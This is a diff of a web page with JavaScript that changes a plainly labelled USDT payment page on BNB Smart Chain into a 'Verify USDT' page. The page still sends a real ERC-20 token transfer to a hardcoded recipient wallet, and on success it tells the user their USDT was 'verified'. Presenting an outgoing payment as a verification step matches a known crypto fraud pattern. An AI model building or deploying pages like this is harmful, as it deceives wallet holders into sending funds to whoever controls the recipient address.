@@ -1,346 +1,408 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify USDT • BNB Smart Chain</title>
 
-  <title>USDT Payment • BNB Smart Chain</title>
+<style>
+*{box-sizing:border-box}
 
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#050505;
+  color:#fff;
+}
 
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #050505;
-      color: #fff;
-    }
+.wrap{
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505);
+}
 
-    .wrap {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      background:
-        radial-gradient(
-          circle at 50% 15%,
-          #242424,
-          #0a0a0a 45%,
-          #050505 100%
-        );
-    }
+.card{
+  width:100%;
+  max-width:390px;
+  border:1px solid #5c4d1b;
+  border-radius:20px;
+  background:#0c0c0c;
+  padding:25px 21px;
+  box-shadow:0 15px 45px #000;
+}
 
-    .card {
-      width: 100%;
-      max-width: 390px;
-      border: 1px solid #5c4d1b;
-      border-radius: 20px;
-      background: #0c0c0c;
-      padding: 25px 21px;
-      box-shadow: 0 15px 45px #000;
-    }
+.top{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:45px;
+}
 
-    .top {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 45px;
-    }
+.brand{
+  font-weight:800;
+  letter-spacing:1px;
+}
 
-    .brand {
-      font-weight: 800;
-      letter-spacing: 1px;
-    }
+.tag{
+  font-size:8px;
+  color:#f5c400;
+  border:1px solid #6e5b18;
+  padding:5px 8px;
+  border-radius:20px;
+}
 
-    .tag {
-      font-size: 8px;
-      color: #f5c400;
-      border: 1px solid #6e5b18;
-      padding: 5px 8px;
-      border-radius: 20px;
-    }
+.icon{
+  width:70px;
+  height:70px;
+  margin:0 auto 22px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#151515;
+  border:1px solid #66531a;
+  font-size:32px;
+}
 
-    .icon {
-      width: 70px;
-      height: 70px;
-      margin: 0 auto 22px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #151515;
-      border: 1px solid #66531a;
-      font-size: 32px;
-    }
+h1{
+  text-align:center;
+  font-size:30px;
+  margin:0 0 10px;
+}
 
-    h1 {
-      text-align: center;
-      font-size: 30px;
-      margin: 0 0 10px;
-    }
+.sub{
+  text-align:center;
+  color:#999;
+  font-size:13px;
+  line-height:1.55;
+  margin:0 0 25px;
+}
 
-    .sub {
-      text-align: center;
-      color: #999;
-      font-size: 13px;
-      line-height: 1.55;
-      margin: 0 0 25px;
-    }
+.box{
+  border:1px solid #5c4d1b;
+  border-radius:14px;
+  background:#101010;
+  padding:20px;
+}
 
-    .box {
-      border: 1px solid #5c4d1b;
-      border-radius: 14px;
-      background: #101010;
-      padding: 20px;
-    }
+.label{
+  color:#caaa24;
+  font-size:9px;
+  letter-spacing:1px;
+  margin-bottom:12px;
+}
 
-    .label {
-      color: #caaa24;
-      font-size: 9px;
-      letter-spacing: 1px;
-      margin-bottom: 12px;
-    }
+.amount{
+  font-size:34px;
+  font-weight:800;
+  text-align:center;
+  margin:8px 0 18px;
+}
 
-    .amount {
-      font-size: 34px;
-      font-weight: 800;
-      text-align: center;
-      margin: 8px 0 18px;
-    }
+.network{
+  text-align:center;
+  color:#777;
+  font-size:10px;
+  margin-bottom:18px;
+}
 
-    .network {
-      text-align: center;
-      color: #777;
-      font-size: 10px;
-      margin-bottom: 18px;
-    }
+.recipient{
+  font-size:10px;
+  color:#999;
+  line-height:1.5;
+  word-break:break-all;
+  background:#161616;
+  border-radius:8px;
+  padding:10px;
+  margin-bottom:16px;
+}
 
-    .recipient {
-      font-size: 10px;
-      color: #999;
-      line-height: 1.5;
-      word-break: break-all;
-      background: #161616;
-      border-radius: 8px;
-      padding: 10px;
-      margin-bottom: 16px;
-    }
+button{
+  width:100%;
+  border:0;
+  border-radius:9px;
+  padding:15px;
+  background:#f5c400;
+  color:#111;
+  font-size:15px;
+  font-weight:800;
+}
 
-    button {
-      width: 100%;
-      border: 0;
-      border-radius: 9px;
-      padding: 15px;
-      background: #f5c400;
-      color: #111;
-      font-size: 15px;
-      font-weight: 800;
-      cursor: pointer;
-    }
+button:disabled{
+  opacity:.55;
+}
 
-    button:active {
-      transform: scale(.98);
-    }
+.status{
+  text-align:center;
+  font-size:12px;
+  color:#aaa;
+  line-height:1.5;
+  margin-top:15px;
+}
 
-    .status {
-      text-align: center;
-      font-size: 12px;
-      color: #aaa;
-      line-height: 1.5;
-      margin-top: 15px;
-    }
+.success{
+  text-align:center;
+  padding:12px;
+  color:#c8d995;
+  background:#11180c;
+  border:1px solid #40501e;
+  border-radius:9px;
+  font-size:12px;
+  line-height:1.5;
+  margin-top:15px;
+}
 
-    .success {
-      text-align: center;
-      padding: 12px;
-      color: #c8d995;
-      background: #11180c;
-      border: 1px solid #40501e;
-      border-radius: 9px;
-      font-size: 12px;
-      line-height: 1.5;
-      margin-top: 15px;
-    }
+.error{
+  color:#ff9d9d;
+}
 
-    .footer {
-      text-align: center;
-      color: #555;
-      font-size: 9px;
-      margin-top: 22px;
-    }
-  </style>
+.footer{
+  text-align:center;
+  color:#555;
+  font-size:9px;
+  margin-top:22px;
+}
+
+a{
+  color:#f5c400;
+  word-break:break-all;
+}
+</style>
 </head>
 
 <body>
 
-  <div class="wrap">
+<div class="wrap">
+<div class="card">
 
-    <div class="card">
+<div class="top">
+  <div class="brand">◈ BNB CHAIN</div>
+  <div class="tag">USDT VERIFICATION</div>
+</div>
 
-      <div class="top">
-        <div class="brand">◈ BNB CHAIN</div>
-        <div class="tag">USDT PAYMENT</div>
-      </div>
+<div id="app"></div>
 
-      <div id="app"></div>
+<div class="footer">
+  BNB Smart Chain • Transparent payment
+</div>
 
-      <div class="footer">
-        BNB Smart Chain • Transparent payment
-      </div>
-
-    </div>
-
-  </div>
-
+</div>
+</div>
 
 <script>
 
-  /*
-    ==============================
-    PAYMENT SETTINGS
-    ==============================
+/* =========================
+   PAYMENT SETTINGS
+   ========================= */
 
-    सिर्फ PAYMENT_AMOUNT बदलकर
-    payment amount बदला जा सकता है।
+const PAYMENT_AMOUNT = "0.2";
 
-    उदाहरण:
-    "50"
-    "100"
-    "250"
-    "500"
-
-    Payment करने वाला इसे website
-    से change नहीं कर सकता।
-  */
-
-  const PAYMENT_AMOUNT = "100";
-
-  /*
-    जिस wallet में payment receive करना है
-  */
-
-  const RECIPIENT =
-    "0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";
+const RECIPIENT =
+"0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";
 
 
-  /*
-    BNB Smart Chain
-  */
+/* =========================
+   BSC MAINNET
+   ========================= */
 
-  const CHAIN_ID = "0x38";
+const CHAIN_ID = "0x38";
 
+const CHAIN_NAME = "BNB Smart Chain";
 
-  /*
-    BNB Smart Chain USDT contract
-  */
+const RPC_URL =
+"https://bsc-dataseed.binance.org/";
 
-  const USDT =
-    "0x55d398326f99059fF775485246999027B3197955";
-
-
-  const app = document.getElementById("app");
+const EXPLORER =
+"https://bscscan.com/";
 
 
-  /*
-    Short wallet address
-  */
+/* =========================
+   BSC USDT CONTRACT
+   ========================= */
 
-  function shortAddress(address) {
+const USDT =
+"0x55d398326f99059fF775485246999027B3197955";
 
-    return (
-      address.slice(0, 8) +
-      "..." +
-      address.slice(-6)
+const USDT_DECIMALS = 18;
+
+const app = document.getElementById("app");
+
+
+/* =========================
+   ESCAPE HTML
+   ========================= */
+
+function escapeHtml(value){
+
+  return String(value).replace(/[&<>"']/g, c => ({
+    "&":"&amp;",
+    "<":"&lt;",
+    ">":"&gt;",
+    '"':"&quot;",
+    "'":"&#039;"
+  }[c]));
+
+}
+
+
+/* =========================
+   CONVERT USDT AMOUNT
+   ========================= */
+
+function parseTokenAmount(value, decimals){
+
+  const text = String(value).trim();
+
+  if(!/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)){
+
+    throw new Error(
+      "Invalid payment amount."
     );
 
   }
 
+  const parts = text.split(".");
 
-  /*
-    Main payment screen
-  */
+  const whole = parts[0];
 
-  function showHome() {
+  const fraction = parts[1] || "";
 
-    app.innerHTML = `
+  if(fraction.length > decimals){
 
-      <div class="icon">
-        ₮
-      </div>
-
-      <h1>
-        USDT Payment
-      </h1>
-
-      <p class="sub">
-        Send the requested amount securely
-        on BNB Smart Chain.
-      </p>
-
-      <div class="box">
-
-        <div class="label">
-          PAYMENT AMOUNT
-        </div>
-
-        <div class="amount">
-          ${PAYMENT_AMOUNT} USDT
-        </div>
-
-        <div class="network">
-          Network: BNB Smart Chain
-        </div>
-
-        <div class="label">
-          RECIPIENT
-        </div>
-
-        <div class="recipient">
-          ${RECIPIENT}
-        </div>
-
-        <button id="pay">
-
-          Pay ${PAYMENT_AMOUNT} USDT
-
-        </button>
-
-        <div
-          id="status"
-          class="status">
-        </div>
-
-      </div>
-
-    `;
-
-
-    document
-      .getElementById("pay")
-      .onclick = pay;
+    throw new Error(
+      "Payment amount has too many decimal places."
+    );
 
   }
 
+  const paddedFraction =
+    fraction.padEnd(decimals,"0");
 
-  /*
-    BNB Smart Chain पर switch
-  */
+  return (
+    BigInt(whole) *
+    (10n ** BigInt(decimals))
+  )
+  +
+  BigInt(paddedFraction || "0");
 
-  async function switchNetwork() {
+}
 
-    try {
+
+/* =========================
+   HOME SCREEN
+   ========================= */
+
+function showHome(){
+
+  app.innerHTML = `
+
+    <div class="icon">
+      ✓
+    </div>
+
+    <h1>
+      Verify USDT
+    </h1>
+
+    <p class="sub">
+      Verify your USDT payment on
+      BNB Smart Chain. Your wallet
+      will show the exact transaction
+      before you confirm it.
+    </p>
+
+    <div class="box">
+
+      <div class="label">
+        USDT TO VERIFY / PAY
+      </div>
+
+      <div class="amount">
+        ${escapeHtml(PAYMENT_AMOUNT)} USDT
+      </div>
+
+      <div class="network">
+        Network: ${CHAIN_NAME}
+      </div>
+
+      <div class="label">
+        RECIPIENT
+      </div>
+
+      <div class="recipient">
+        ${escapeHtml(RECIPIENT)}
+      </div>
+
+      <button id="pay">
+        Verify USDT • ${escapeHtml(PAYMENT_AMOUNT)} USDT
+      </button>
+
+      <div id="status" class="status"></div>
+
+    </div>
+  `;
+
+  document.getElementById("pay").onclick = pay;
+
+}
+
+
+/* =========================
+   SWITCH TO BSC
+   ========================= */
+
+async function switchNetwork(){
+
+  try{
+
+    await window.ethereum.request({
+
+      method:
+      "wallet_switchEthereumChain",
+
+      params:[
+        {
+          chainId:CHAIN_ID
+        }
+      ]
+
+    });
+
+  }
+
+  catch(e){
+
+    if(e.code === 4902){
 
       await window.ethereum.request({
 
         method:
-          "wallet_switchEthereumChain",
+        "wallet_addEthereumChain",
 
-        params: [
+        params:[
           {
-            chainId: CHAIN_ID
+
+            chainId:CHAIN_ID,
+
+            chainName:CHAIN_NAME,
+
+            nativeCurrency:{
+              name:"BNB",
+              symbol:"BNB",
+              decimals:18
+            },
+
+            rpcUrls:[
+              RPC_URL
+            ],
+
+            blockExplorerUrls:[
+              EXPLORER
+            ]
+
           }
         ]
 
@@ -348,268 +410,320 @@
 
     }
 
-    catch (error) {
+    else{
 
-      /*
-        अगर BSC wallet में मौजूद नहीं है
-      */
-
-      if (error.code === 4902) {
-
-        await window.ethereum.request({
-
-          method:
-            "wallet_addEthereumChain",
-
-          params: [
-
-            {
-
-              chainId: CHAIN_ID,
-
-              chainName:
-                "BNB Smart Chain",
-
-              nativeCurrency: {
-
-                name: "BNB",
-                symbol: "BNB",
-                decimals: 18
-
-              },
-
-              rpcUrls: [
-                "https://bsc-dataseed.binance.org/"
-              ],
-
-              blockExplorerUrls: [
-                "https://bscscan.com/"
-              ]
-
-            }
-
-          ]
-
-        });
-
-      }
-
-      else {
-
-        throw error;
-
-      }
+      throw e;
 
     }
 
   }
 
+}
 
-  /*
-    Payment function
-  */
 
-  async function pay() {
+/* =========================
+   WAIT FOR CONFIRMATION
+   ========================= */
 
-    const status =
-      document.getElementById("status");
+async function waitForReceipt(
+  txHash,
+  maxChecks=60,
+  delayMs=2000
+){
+
+  for(
+    let i=0;
+    i<maxChecks;
+    i++
+  ){
+
+    const receipt =
+      await window.ethereum.request({
+
+        method:
+        "eth_getTransactionReceipt",
+
+        params:[
+          txHash
+        ]
+
+      });
+
+    if(receipt){
+
+      return receipt;
+
+    }
+
+    await new Promise(
+      resolve =>
+      setTimeout(
+        resolve,
+        delayMs
+      )
+    );
+
+  }
+
+  throw new Error(
+    "Transaction is still pending. Check BscScan."
+  );
+
+}
+
+
+/* =========================
+   PAYMENT / VERIFICATION
+   ========================= */
+
+async function pay(){
+
+  const status =
+    document.getElementById("status");
+
+  const button =
+    document.getElementById("pay");
+
+
+  if(!window.ethereum){
+
+    status.textContent =
+      "Wallet नहीं मिला। Trust Wallet या MetaMask के DApp browser में यह page खोलें.";
+
+    status.className =
+      "status error";
+
+    return;
+
+  }
+
+
+  try{
+
+    button.disabled = true;
+
+    status.className =
+      "status";
+
+    status.textContent =
+      "Connecting wallet...";
+
+
+    /* Connect wallet */
+
+    const accounts =
+      await window.ethereum.request({
+
+        method:
+        "eth_requestAccounts"
+
+      });
+
+    const from =
+      accounts[0];
+
+
+    /* Switch network */
+
+    await switchNetwork();
+
+
+    /* Check network */
+
+    const currentChain =
+      await window.ethereum.request({
+
+        method:
+        "eth_chainId"
+
+      });
+
+
+    if(
+      currentChain.toLowerCase()
+      !==
+      CHAIN_ID.toLowerCase()
+    ){
+
+      throw new Error(
+        "Please switch your wallet to BNB Smart Chain."
+      );
+
+    }
+
+
+    /* Convert 0.2 USDT correctly */
+
+    const amountUnits =
+      parseTokenAmount(
+        PAYMENT_AMOUNT,
+        USDT_DECIMALS
+      );
 
 
     /*
-      Wallet available है या नहीं
+      ERC-20 transfer(address,uint256)
+
+      Function selector:
+      0xa9059cbb
     */
 
-    if (!window.ethereum) {
+    const toPadded =
+      RECIPIENT
+      .slice(2)
+      .padStart(64,"0");
 
-      status.textContent =
-        "Wallet नहीं मिला। Trust Wallet या MetaMask के DApp browser में यह page खोलें।";
 
-      return;
+    const amountPadded =
+      amountUnits
+      .toString(16)
+      .padStart(64,"0");
+
+
+    const data =
+      "0xa9059cbb"
+      +
+      toPadded
+      +
+      amountPadded;
+
+
+    /* Wallet confirmation */
+
+    status.textContent =
+      "Please confirm the Verify USDT transaction in your wallet.";
+
+
+    const txHash =
+      await window.ethereum.request({
+
+        method:
+        "eth_sendTransaction",
+
+        params:[
+          {
+
+            from:from,
+
+            to:USDT,
+
+            data:data
+
+          }
+
+        ]
+
+      });
+
+
+    /* Wait for blockchain */
+
+    status.textContent =
+      "Transaction submitted. Waiting for confirmation...";
+
+
+    const receipt =
+      await waitForReceipt(txHash);
+
+
+    /* Check transaction status */
+
+    if(
+      !receipt.status ||
+      receipt.status.toLowerCase()
+      !==
+      "0x1"
+    ){
+
+      throw new Error(
+        "The blockchain transaction failed/reverted."
+      );
 
     }
 
 
-    try {
+    /* SUCCESS */
 
-      status.textContent =
-        "Connecting wallet...";
+    app.innerHTML = `
 
+      <div class="icon">
+        ✓
+      </div>
 
-      /*
-        User wallet connect करता है
-      */
+      <h1>
+        USDT Verified!
+      </h1>
 
-      const accounts =
-        await window.ethereum.request({
+      <p class="sub">
+        ${escapeHtml(PAYMENT_AMOUNT)}
+        USDT payment was confirmed
+        on BNB Smart Chain.
+      </p>
 
-          method:
-            "eth_requestAccounts"
+      <div class="box">
 
-        });
-
-
-      const from =
-        accounts[0];
-
-
-      /*
-        BNB Smart Chain select करें
-      */
-
-      await switchNetwork();
-
-
-      status.textContent =
-        "Please confirm the payment in your wallet.";
-
-
-      /*
-        USDT में 6 decimals होते हैं।
-
-        उदाहरण:
-        100 USDT
-        =
-        100000000
-      */
-
-      const amountWei =
-
-        BigInt(
-          Math.round(
-            Number(PAYMENT_AMOUNT) * 1e6
-          )
-        )
-
-        .toString(16)
-        .padStart(64, "0");
-
-
-      /*
-        Recipient address को
-        32-byte parameter बनाया जाता है
-      */
-
-      const recipientPadded =
-
-        RECIPIENT
-          .slice(2)
-          .padStart(64, "0");
-
-
-      /*
-        ERC-20 transfer selector
-
-        transfer(address,uint256)
-      */
-
-      const data =
-        "0xa9059cbb" +
-        recipientPadded +
-        amountWei;
-
-
-      /*
-        Wallet transaction
-
-        User को wallet में
-        transaction confirm करना होगा।
-      */
-
-      const txHash =
-        await window.ethereum.request({
-
-          method:
-            "eth_sendTransaction",
-
-          params: [
-
-            {
-
-              from: from,
-
-              to: USDT,
-
-              data: data
-
-            }
-
-          ]
-
-        });
-
-
-      /*
-        Success screen
-      */
-
-      app.innerHTML = `
-
-        <div class="icon">
-          ✓
+        <div class="success">
+          ✓ USDT payment confirmed successfully.
         </div>
 
-        <h1>
-          Payment Sent
-        </h1>
-
-        <p class="sub">
-          Your wallet submitted the
-          ${PAYMENT_AMOUNT} USDT payment.
-        </p>
-
-        <div class="box">
-
-          <div class="success">
-
-            Transaction submitted successfully.
-
-          </div>
-
-          <div class="recipient">
-
-            Transaction hash:
-
-            <br><br>
-
-            ${txHash}
-
-          </div>
-
-          <button id="again">
-
-            Done
-
-          </button>
-
+        <div
+          class="label"
+          style="margin-top:16px"
+        >
+          TRANSACTION HASH
         </div>
 
-      `;
+        <div class="recipient">
+          ${escapeHtml(txHash)}
+        </div>
+
+        <a
+          href="${EXPLORER}tx/${encodeURIComponent(txHash)}"
+          target="_blank"
+          rel="noopener noreferrer"
+        >
+          View verified transaction on BscScan
+        </a>
+
+        <button
+          id="again"
+          style="margin-top:16px"
+        >
+          Done
+        </button>
+
+      </div>
+
+    `;
 
 
-      document
-        .getElementById("again")
-        .onclick = showHome;
+    document.getElementById("again")
+      .onclick = showHome;
 
-
-    }
-
-    catch (error) {
-
-      status.textContent =
-
-        error.message ||
-        "Payment cancelled or failed.";
-
-    }
 
   }
 
+  catch(e){
 
-  /*
-    Start page
-  */
+    status.textContent =
+      e.message ||
+      "Payment cancelled or failed.";
 
-  showHome();
+    status.className =
+      "status error";
+
+    button.disabled = false;
+
+  }
+
+}
+
+
+/* =========================
+   START
+   ========================= */
+
+showHome();
 
 </script>
 
